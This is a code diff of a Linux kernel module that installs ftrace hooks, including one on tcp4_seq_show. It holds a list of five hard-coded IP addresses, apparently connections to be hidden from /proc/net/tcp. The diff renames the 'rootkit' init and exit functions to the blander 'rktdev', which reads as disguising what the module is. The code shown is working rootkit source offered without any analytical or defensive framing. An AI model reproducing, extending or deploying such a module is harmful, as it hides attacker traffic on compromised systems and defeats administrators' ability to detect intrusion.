@@ -24,20 +24,15 @@ static struct ftrace_hook hooks2[] = {
     HOOK2("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 };
 
-/* Module initialization function */
-static int __init rootkit_init(void)
+static int __init rktdev_init(void)
 {
     int err;
 
-    // 初始化黑名单 IP
     blacklist_ips[0] = in_aton("172.104.181.84"); 
     blacklist_ips[1] = in_aton("172.104.60.29");   
     blacklist_ips[2] = in_aton("103.3.62.5");
     blacklist_ips[3] = in_aton("172.104.57.250");
     blacklist_ips[4] = in_aton("143.42.74.25");
-
-
-
 
 
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -51,11 +46,11 @@ static int __init rootkit_init(void)
     return 0;
 }
 
-static void __exit rootkit_exit(void)
+static void __exit rktdev_exit(void)
 {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     fh_remove_hooks(hooks2, ARRAY_SIZE(hooks2));
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
+module_init(rktdev_init);
+module_exit(rktdev_exit);
